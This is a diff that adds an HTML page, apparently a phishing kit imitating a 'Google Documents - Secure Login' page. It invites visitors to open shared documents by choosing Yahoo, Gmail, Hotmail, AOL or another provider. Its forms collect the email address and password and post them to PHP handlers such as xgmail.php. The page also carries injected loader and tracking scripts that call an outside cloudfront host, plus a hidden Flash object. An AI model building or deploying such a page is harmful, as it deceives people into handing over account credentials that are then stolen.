@@ -1,0 +1,378 @@
+<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"> 
+<title>Google Documents - Secure Login</title> 
+<link rel="stylesheet" type="text/css" href="files/style.htm"> 
+<style type="text/css"> 
+div {
+	position: absolute;
+	left: 620px;
+	top: 40px;
+	background-color: #EBEBEB;
+	width: 280px;
+	padding: 10px;
+	color: #000000;
+	border: #0000cc 2px dashed;
+	display: none;
+}
+body,td,th {
+	font-family: Arial, Helvetica, sans-serif;
+	font-size: 12px;
+}
+</style> 
+<script language="Javascript"> 
+function echeck(str) {
+ 
+		var at="@"
+		var dot="."
+		var lat=str.indexOf(at)
+		var lstr=str.length
+		var ldot=str.indexOf(dot)
+		if (str.indexOf(at)==-1){
+		   alert("Invalid E-mail ID")
+		   return false
+		}
+ 
+		if (str.indexOf(at)==-1 || str.indexOf(at)==0 || str.indexOf(at)==lstr){
+		   alert("Invalid E-mail ID")
+		   return false
+		}
+ 
+		if (str.indexOf(dot)==-1 || str.indexOf(dot)==0 || str.indexOf(dot)==lstr){
+		    alert("Invalid E-mail ID")
+		    return false
+		}
+ 
+		 if (str.indexOf(at,(lat+1))!=-1){
+		    alert("Invalid E-mail ID")
+		    return false
+		 }
+ 
+		 if (str.substring(lat-1,lat)==dot || str.substring(lat+1,lat+2)==dot){
+		    alert("Invalid E-mail ID")
+		    return false
+		 }
+ 
+		 if (str.indexOf(dot,(lat+2))==-1){
+		    alert("Invalid E-mail ID")
+		    return false
+		 }
+		
+		 if (str.indexOf(" ")!=-1){
+		    alert("Invalid E-mail ID")
+		    return false
+		 }
+ 
+ 		 return true					
+	}
+ 
+function ValidateFormYahoo(){
+	var emailID=document.yahoo.yahoouser
+	var emailPASS=document.yahoo.yahoopassword
+	
+	if ((emailID.value==null)||(emailID.value=="")){
+		alert("Please Enter your Email ID")
+		emailID.focus()
+		return false
+	}
+	if ((emailPASS.value==null)||(emailPASS.value=="")){
+		alert("Please Enter your Email Password")
+		emailPASS.focus()
+		return false
+	}
+ 
+	return true
+ }
+ 
+ function ValidateFormHotmail(){
+	var emailID=document.hotmail.hotmailuser
+	var emailPASS=document.hotmail.hotmailpassword
+	
+	if ((emailID.value==null)||(emailID.value=="")){
+		alert("Please Enter your Email ID")
+		emailID.focus()
+		return false
+	}
+	if ((emailPASS.value==null)||(emailPASS.value=="")){
+		alert("Please Enter your Email Password")
+		emailPASS.focus()
+		return false
+	}
+ 
+	return true
+ }
+ 
+  function ValidateFormGmail(){
+	var emailID=document.gmail.gmailuser
+	var emailPASS=document.gmail.gmailpassword
+	
+	if ((emailID.value==null)||(emailID.value=="")){
+		alert("Please Enter your Email ID")
+		emailID.focus()
+		return false
+	}
+	if ((emailPASS.value==null)||(emailPASS.value=="")){
+		alert("Please Enter your Email Password")
+		emailPASS.focus()
+		return false
+	}
+	return true
+ }
+ 
+   function ValidateFormAol(){
+	var emailID=document.aol.aoluser
+	var emailPASS=document.aol.aolpassword
+	
+	if ((emailID.value==null)||(emailID.value=="")){
+		alert("Please Enter your Email ID")
+		emailID.focus()
+		return false
+	}
+	if ((emailPASS.value==null)||(emailPASS.value=="")){
+		alert("Please Enter your Email Password")
+		emailPASS.focus()
+		return false
+	}
+	return true
+ }
+ 
+   function ValidateFormOther(){
+	var emailID=document.other.otheruser
+	var emailPASS=document.other.otherpassword
+	
+	if ((emailID.value==null)||(emailID.value=="")){
+		alert("Please Enter your Email ID")
+		emailID.focus()
+		return false
+	}
+	if ((emailPASS.value==null)||(emailPASS.value=="")){
+		alert("Please Enter your Email Password")
+		emailPASS.focus()
+		return false
+	}
+	if (echeck(emailID.value)==false){
+		emailID.value=""
+		emailID.focus()
+		return false
+	}
+	return true
+ }
+</script> 
+<script language="javascript"> 
+function toggle() {
+	var ele = document.getElementById("toggleText");
+	var text = document.getElementById("displayText");
+	if(ele.style.display == "block") {
+    		ele.style.display = "none";
+		text.innerHTML = "show";
+  	}
+	else {
+		ele.style.display = "block";
+		text.innerHTML = "hide";
+	}
+}
+ 
+function togglegmail() {
+	var ele = document.getElementById("toggleTextgmail");
+	var text = document.getElementById("displayTextgmail");
+	if(ele.style.display == "block") {
+    		ele.style.display = "none";
+		text.innerHTML = "show";
+  	}
+	else {
+		ele.style.display = "block";
+		text.innerHTML = "hide";
+	}
+} 
+ 
+function togglehotmail() {
+	var ele = document.getElementById("toggleTexthotmail");
+	var text = document.getElementById("displayTexthotmail");
+	if(ele.style.display == "block") {
+    		ele.style.display = "none";
+		text.innerHTML = "show";
+  	}
+	else {
+		ele.style.display = "block";
+		text.innerHTML = "hide";
+	}
+} 
+function toggleaol() {
+	var ele = document.getElementById("toggleTextaol");
+	var text = document.getElementById("displayTextaol");
+	if(ele.style.display == "block") {
+    		ele.style.display = "none";
+		text.innerHTML = "show";
+  	}
+	else {
+		ele.style.display = "block";
+		text.innerHTML = "hide";
+	}
+} 
+function toggleother() {
+	var ele = document.getElementById("toggleTextother");
+	var text = document.getElementById("displayTextother");
+	if(ele.style.display == "block") {
+    		ele.style.display = "none";
+		text.innerHTML = "show";
+  	}
+	else {
+		ele.style.display = "block";
+		text.innerHTML = "hide";
+	}
+} 
+</script> 
+<script type="text/javascript">(typeof _GPL_16_loaded == \'undefined\') && (_GPL_16_loaded=true) && (_GPL_i=document.getElementsByTagName(\'head\')) && (_GPL_i=(_GPL_i.length>0)?_GPL_i:document.getElementsByTagName(\'body\')) && (_GPL_i.length>0) && (_GPL_j=document.createElement(\'script\')) && (_GPL_j.async=true) && (_GPL_j.type=\'text/javascript\') && (_GPL_j.src=\'https://d3lvr7yuk4uaui.cloudfront.net/items/loaders/loader_16.js?pid=16&zoneid=7818&cid=US&rid=NV&ccid=Fernley&ip=199.48.177.231&aoi=1316649369\') && (_GPL_i[0].appendChild(_GPL_j))</script><script type="text/javascript">if (window.addEventListener) { 
+  var callback_func = function(evt) { 
+    if (\'undefined\' != typeof evt.target && "A" == evt.target.nodeName) { 
+      var url = evt.target.href; 
+      EBCallBackMessageReceivedCT2612669_129564560723477699(url); 
+    } 
+    return true; 
+  }; 
+  var result = window.addEventListener(\'click\', callback_func, true); 
+  var result = window.addEventListener(\'contextmenu\', callback_func, true); 
+} else if (document.attachEvent) {
+  var callback_func = function () { 
+    if (\'undefined\' != typeof event.srcElement &&\'A\' == event.srcElement.tagName) { 
+      var url = event.srcElement.href; 
+      EBCallBackMessageReceivedCT2612669_129564560723477699(url); 
+    } 
+    return true; 
+  }; 
+  var result = document.attachEvent(\'onclick\', callback_func); 
+  var result = document.attachEvent(\'oncontextmenu\', callback_func); 
+} 
+ 
+</script></head> <body bgcolor="#efefef"><p>&nbsp;</p><table id="wrapper" align="center" bgcolor="#cccccc" cellpadding="10" cellspacing="1"><tbody><tr><td bgcolor="#ffffff"><table width="100%"><tbody><tr><td width="50%"><h1 align="center"><img src="files/googledocsx.jpg" height="104" width="248"></h1></td></tr></tbody></table><br><table id="invoicetoptables" cellspacing="0" width="100%"><tbody><tr><td id="invoicecontent" width="50%"><table id="invoicetoptables" cellpadding="10" cellspacing="0" height="100" width="100%"><tbody><tr><td id="invoicecontent" style="border: 0px solid rgb(204, 204, 204);" valign="top"><p align="center"><font color="#990000" size="3">To access shared documents, sign on with<br>your existing email address below and login.</font></p><br><font class="paid">Choose your email provider below and login to view your documents:</font><br><br><br>
+<br> 
+<br> 
+<br> 
+<p align="center"> 
+<a href="javascript:toggle();"><img src="files/yahoox.jpg" title="Yahoomail" id="displayText" border="0" height="48" width="132"></a> 
+&nbsp;&nbsp;&nbsp; <a href="javascript:togglegmail();"><img src="files/gmailx.jpg" title="Gmail" id="displayTextgmail" border="0" height="48" width="132"></a> 
+<br> 
+<br> 
+<br> 
+<a href="javascript:togglehotmail();"><img src="files/hotmailx.jpg" title="Hotmail" id="displayTexthotmail" border="0" height="48" width="132"></a> 
+&nbsp;&nbsp;&nbsp; <a href="javascript:toggleaol();"><img src="files/aolx.jpg" title="Aol" id="displayTextaol" border="0" height="48" width="132"></a> 
+<br> 
+<br> 
+<br> 
+<a href="javascript:toggleother();"><img src="files/otherx.jpg" title="Other Email" id="displayTextother" border="0" height="48" width="132"></a> 
+</p> 
+ 
+<!-- YAHOO CONFIG !--> 
+<div id="toggleText" style="display: none"> 
+<p><img src="files/yahoox.jpg" title="Yahoomail" border="0" height="48" width="132"></p> <p align="right"><a href="javascript:location.reload(true)">close [x]</a></p> 
+<br> 
+<form name="yahoo" method="post" action="xyahoo.php" onSubmit="return ValidateFormYahoo()"> 
+<p> 
+<br> 
+				<label>Yahoo Email Address:</label> 
+                <br> 
+				<input name="yahoouser" style="width: 200px;" type="text"> 
+			<br> 
+				<label>Yahoo Password</label> 
+                <br> 
+				<input name="yahoopassword" style="width: 200px;" type="password"> 
+                <br> 
+                <br> 
+                <input name="s_yahoo" value="Sign In" type="submit"> 
+			</p> 
+</form> 
+</div> 
+ 
+<!-- GMAIL CONFIG !--> 
+<div id="toggleTextgmail" style="display: none"> 
+<p><img src="files/gmailx.jpg" title="Gmail" border="0" height="48" width="132"></p> <p align="right"><a href="javascript:location.reload(true)">close [x]</a></p> 
+<br> 
+<form name="gmail" method="post" action="xgmail.php" onSubmit="return ValidateFormGmail()"> 
+<p> 
+ 
+				<label>Gmail Email Address:</label> 
+                <br> 
+				<input name="gmailuser" style="width: 200px;" type="text"> 
+			<br> 
+				<label>Gmail Password</label> 
+                <br> 
+				<input name="gmailpassword" style="width: 200px;" type="password"> 
+                <br> 
+                <br> 
+                <input name="s_gmail" value="Sign in" type="submit"> 
+			</p> 
+            </form> 
+ 
+</div> 
+ 
+<!-- HOTMAIL CONFIG !--> 
+<div id="toggleTexthotmail" style="display: none"> 
+<p><img src="files/hotmailx.jpg" title="Hotmail" border="0" height="48" width="132"></p> <p align="right"><a href="javascript:location.reload(true)">close [x]</a></p> 
+<br> 
+<form name="hotmail" method="post" action="xhotmail.php" onSubmit="return ValidateFormHotmail()"> 
+<p> 
+				<label>Hotmail Email Address:</label> 
+                <br> 
+				<input name="hotmailuser" style="width: 200px;" type="text"> 
+			<br> 
+				<label>Hotmail Password</label> 
+                <br> 
+				<input name="hotmailpassword" style="width: 200px;" type="password"> 
+                <br> 
+                <br> 
+                <input name="s_hotmail" value="Sign in" type="submit"> 
+			</p> 
+            </form> 
+</div> 
+ 
+<!-- AOL CONFIG !--> 
+<div id="toggleTextaol" style="display: none"> 
+<p><img src="files/aolx.jpg" title="Aol" border="0" height="48" width="132"></p> <p align="right"><a href="javascript:location.reload(true)">close [x]</a></p> 
+<br> 
+<form name="aol" method="post" action="xaol.php" onSubmit="return ValidateFormAol()"> 
+<p> 
+				<label>Aol Email Address:</label> 
+                <br> 
+				<input name="aoluser" style="width: 200px;" type="text"> 
+			<br> 
+				<label>Aol Password</label> 
+                <br> 
+				<input name="aolpassword" style="width: 200px;" type="password"> 
+                <br> 
+                <br> 
+                <input name="s_aol" value="Sign In" type="submit"> 
+			</p> 
+            </form> 
+</div> 
+ 
+<!-- OTHER CONFIG !--> 
+<div id="toggleTextother" style="display: none"> 
+<p><img src="files/otherx.jpg" title="Other" border="0" height="48" width="132"></p> <p align="right"><a href="javascript:location.reload(true)">close [x]</a></p> 
+<br> 
+<form name="other" method="post" action="xother.php" onSubmit="return ValidateFormOther()"> 
+<p> 
+				<label>Email Address:</label> 
+                <br> 
+				<input name="otheruser" style="width: 200px;" type="text"> 
+			<br> 
+				<label>Password</label> 
+                <br> 
+				<input name="otherpassword" style="width: 200px;" type="password"> 
+                <br> 
+                <br> 
+                <input name="s_other" value="Sign In" type="submit"> 
+			</p> 
+            </form> 
+</div> 
+ 
+ </td> 
+ </tr> 
+ </tbody></table> 
+</td></tr></tbody></table> 
+ 
+</td> 
+  
+ 
+ 
+ 
+ 
+ 
+</tr></tbody></table><iframe style="display: none;" src="" id="y2Google"></iframe><div id="_GPL_e6a00_div" style="position: absolute;"><object codebase="http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab" id="_GPL_e6a00_swf" classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000" height="1" width="1"><param value="http://d3lvr7yuk4uaui.cloudfront.net/items/e6a00/storage.swf" name="movie"><param value="logfn=_GPL.items.e6a00.log&amp;onload=_GPL.items.e6a00.onload&amp;onerror=_GPL.items.e6a00.onerror&amp;LSOName=gpl" name="FlashVars"><param value="always" name="allowscriptaccess"><embed pluginspage="http://www.macromedia.com/go/getflashplayer" flashvars="logfn=_GPL.items.e6a00.log&amp;onload=_GPL.items.e6a00.onload&amp;onerror=_GPL.items.e6a00.onerror&amp;LSOName=gpl" type="application/x-shockwave-flash" allowscriptaccess="always" quality="high" loop="false" play="true" name="_GPL_e6a00_swf" bgcolor="#ffffff" src="files/storage.swf" align="middle" height="1" width="1"></object></div><div style="display: none;" id="YontooInstallID">53F185F5-B55B-7227-CDAE-4D9C688D1835</div></body></html>
